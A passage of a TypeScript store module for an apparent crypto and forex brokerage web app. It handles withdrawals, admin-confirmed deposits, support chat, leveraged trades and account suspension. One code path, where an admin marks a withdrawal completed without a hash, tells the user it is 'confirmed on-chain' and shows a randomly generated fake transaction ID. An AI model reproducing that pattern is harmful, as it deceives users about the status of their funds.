    network?: string;
    destinationAddress?: string;
    bankName?: string;
    accountHolder?: string;
    accountNumber?: string;
    iban?: string;
    swiftCode?: string;
    routingNumber?: string;
    paypalEmail?: string;
    amount: number;
  }): { success: boolean; message: string; withdrawal?: WithdrawalRecord } {
    const user = memoryState.users.find(u => u.id === params.userId);
    if (!user) return { success: false, message: 'User account not found' };

    if (user.balance < params.amount) {
      return { success: false, message: 'Insufficient account balance for requested withdrawal' };
    }

    const method = params.method || 'crypto';
    const fee = method === 'bank' ? 25 : method === 'paypal' ? 5 : (params.asset === 'BTC' ? 20 : params.asset === 'ETH' ? 18 : 10);
    const netAmount = params.amount;

    user.balance = Number((user.balance - netAmount).toFixed(2));
    user.totalWithdrawn = Number(((user.totalWithdrawn || 0) + netAmount).toFixed(2));

    const newWithdrawal: WithdrawalRecord = {
      id: `wd_${Date.now()}`,
      userId: user.id,
      userName: user.name,
      userEmail: user.email,
      method: method,
      asset: params.asset,
      network: params.network,
      destinationAddress: params.destinationAddress,
      bankName: params.bankName,
      accountHolder: params.accountHolder,
      accountNumber: params.accountNumber,
      iban: params.iban,
      swiftCode: params.swiftCode,
      routingNumber: params.routingNumber,
      paypalEmail: params.paypalEmail,
      amount: netAmount,
      fee,
      status: 'PENDING',
      requestedAt: new Date().toISOString()
    };

    memoryState.withdrawals.unshift(newWithdrawal);

    const destLabel = method === 'bank' 
      ? `Bank Transfer (${params.bankName || 'Bank Wire'})`
      : method === 'paypal'
      ? `PayPal (${params.paypalEmail})`
      : `${params.asset} (${params.network || 'Crypto'})`;

    memoryState.notifications.unshift({
      id: createUniqueNotifId(),
      title: 'Withdrawal Request Submitted',
      message: `Withdrawal of $${netAmount.toLocaleString()} via ${destLabel} has been submitted for broker authorization.`,
      type: 'withdrawal',
      timestamp: new Date().toISOString(),
      read: false,
      userId: user.id
    });

    saveState();
    return { success: true, message: 'Withdrawal successfully initiated', withdrawal: newWithdrawal };
  },

  updateWithdrawalStatus(
    withdrawalId: string,
    status: 'PROCESSING' | 'COMPLETED' | 'REJECTED',
    txHash?: string,
    reason?: string
  ): boolean {
    const wd = memoryState.withdrawals.find(w => w.id === withdrawalId);
    if (!wd) return false;

    wd.status = status;
    wd.processedAt = new Date().toISOString();
    if (txHash) wd.txHash = txHash;
    if (reason) wd.rejectionReason = reason;

    const user = memoryState.users.find(u => u.id === wd.userId);

    if (status === 'REJECTED' && user) {
      // Refund balance
      user.balance = Number((user.balance + wd.amount).toFixed(2));
    } else if (status === 'COMPLETED' && user) {
      user.totalWithdrawn = Number((user.totalWithdrawn + wd.amount).toFixed(2));
    }

    if (user) {
      memoryState.notifications.unshift({
        id: createUniqueNotifId(),
        title: status === 'COMPLETED' ? '🎉 Withdrawal Dispatched' : status === 'PROCESSING' ? 'Withdrawal Processing' : '⚠️ Withdrawal Declined',
        message: status === 'COMPLETED'
          ? `Your withdrawal of $${wd.amount.toLocaleString()} (${wd.asset}) has been confirmed on-chain. TXID: ${txHash || '0x' + Math.random().toString(16).slice(2, 18)}`
          : status === 'PROCESSING'
          ? `Your withdrawal of $${wd.amount.toLocaleString()} is being processed by the liquidity custodian.`
          : `Withdrawal request was rejected. ${reason || 'Amount refunded back to trading balance.'}`,
        type: 'withdrawal',
        timestamp: new Date().toISOString(),
        read: false,
        userId: user.id
      });
    }

    saveState();
    return true;
  },

  // Deposit Management
  submitDeposit(params: {
    userId: string;
    asset: 'BTC' | 'ETH' | 'USDT' | 'SOL';
    network: string;
    amount: number;
    txHash: string;
    proofNote?: string;
  }): DepositRecord {
    const user = memoryState.users.find(u => u.id === params.userId);
    const newDep: DepositRecord = {
      id: `dep_${Date.now()}`,
      userId: params.userId,
      userName: user ? user.name : 'Unknown User',
      userEmail: user ? user.email : '',
      asset: params.asset,
      network: params.network,
      amount: params.amount,
      txHash: params.txHash,
      proofNote: params.proofNote,
      status: 'PENDING',
      createdAt: new Date().toISOString()
    };

    memoryState.deposits.unshift(newDep);

    if (user) {
      memoryState.notifications.unshift({
        id: createUniqueNotifId(),
        title: 'Deposit Confirmation Pending',
        message: `Submitted $${params.amount.toLocaleString()} ${params.asset}. Waiting for custodian network confirmation.`,
        type: 'deposit',
        timestamp: new Date().toISOString(),
        read: false,
        userId: user.id
      });
    }

    saveState();
    return newDep;
  },

  confirmDeposit(depositId: string, status: 'CONFIRMED' | 'REJECTED'): boolean {
    const dep = memoryState.deposits.find(d => d.id === depositId);
    if (!dep) return false;

    dep.status = status;
    dep.confirmedAt = new Date().toISOString();

    const user = memoryState.users.find(u => u.id === dep.userId);
    if (status === 'CONFIRMED' && user) {
      user.balance = Number((user.balance + dep.amount).toFixed(2));
      user.totalDeposited = Number((user.totalDeposited + dep.amount).toFixed(2));

      memoryState.notifications.unshift({
        id: createUniqueNotifId(),
        title: '💰 Deposit Credited!',
        message: `Your deposit of $${dep.amount.toLocaleString()} (${dep.asset}) has been confirmed and added to your balance.`,
        type: 'deposit',
        timestamp: new Date().toISOString(),
        read: false,
        userId: user.id
      });
    }

    saveState();
    return true;
  },

  // Bolt Chat Support
  sendChatMessage(params: {
    userId: string;
    userName: string;
    sender: 'client' | 'admin';
    message: string;
  }): BoltChatMessage {
    const newMsg: BoltChatMessage = {
      id: `chat_${Date.now()}_${Math.random().toString(36).slice(2, 5)}`,
      userId: params.userId,
      userName: params.userName,
      sender: params.sender,
      message: params.message.trim(),
      timestamp: new Date().toISOString(),
      read: params.sender === 'client' ? false : true
    };

    memoryState.chats.push(newMsg);

    // If admin replies, notify the client
    if (params.sender === 'admin') {
      memoryState.notifications.unshift({
        id: createUniqueNotifId(),
        title: 'Bolt Support Desk Reply',
        message: `Support: "${params.message.slice(0, 75)}${params.message.length > 75 ? '...' : ''}"`,
        type: 'chat',
        timestamp: new Date().toISOString(),
        read: false,
        userId: params.userId
      });
    }

    saveState();
    return newMsg;
  },

  markChatsRead(userId: string) {
    let changed = false;
    memoryState.chats.forEach(c => {
      if (c.userId === userId && !c.read) {
        c.read = true;
        changed = true;
      }
    });
    if (changed) saveState();
  },

  // Trading Orders
  openTrade(trade: Omit<TradeOrder, 'id' | 'status' | 'openedAt' | 'pnl' | 'pnlPercent'>): TradeOrder {
    const user = memoryState.users.find(u => u.id === trade.userId);
    if (user && user.balance >= trade.amount) {
      user.balance = Number((user.balance - trade.amount).toFixed(2));
    }

    const newTrade: TradeOrder = {
      ...trade,
      id: `tr_${Date.now()}`,
      status: 'OPEN',
      pnl: 0,
      pnlPercent: 0,
      openedAt: new Date().toISOString()
    };

    memoryState.trades.unshift(newTrade);
    saveState();
    return newTrade;
  },

  closeTrade(tradeId: string, exitPrice: number): boolean {
    const trade = memoryState.trades.find(t => t.id === tradeId && t.status === 'OPEN');
    if (!trade) return false;

    trade.status = 'CLOSED';
    trade.closedAt = new Date().toISOString();
    trade.currentPrice = exitPrice;

    // Calculate final PnL
    const diff = trade.type === 'BUY'
      ? (exitPrice - trade.entryPrice) / trade.entryPrice
      : (trade.entryPrice - exitPrice) / trade.entryPrice;

    trade.pnl = Number((trade.amount * trade.leverage * diff).toFixed(2));
    trade.pnlPercent = Number((diff * trade.leverage * 100).toFixed(2));

    // Return margin + pnl to user
    const user = memoryState.users.find(u => u.id === trade.userId);
    if (user) {
      const returnAmount = Math.max(0, trade.amount + trade.pnl);
      user.balance = Number((user.balance + returnAmount).toFixed(2));
      if (trade.pnl > 0) {
        user.totalProfit = Number((user.totalProfit + trade.pnl).toFixed(2));
      }
    }

    saveState();
    return true;
  },

  // Admin Settings Updates
  updateAdminConfig(config: Partial<AdminSettingsConfig>) {
    memoryState.adminConfig = {
      ...memoryState.adminConfig,
      ...config
    };
    saveState();
  },

  toggleUserSuspension(userId: string): boolean {
    const user = memoryState.users.find(u => u.id === userId);
    if (!user) return false;
    user.isSuspended = !user.isSuspended;
    saveState();
    return true;
  },

  markNotificationAsRead(notifId: string) {
    const notif = memoryState.notifications.find(n => n.id === notifId);
    if (notif) {
      notif.read = true;
      saveState();
    }
  }
};

export function useStore(): AppStoreState {
  return useSyncExternalStore(
    StoreService.subscribe,
    StoreService.getState,
    StoreService.getState
  );
}

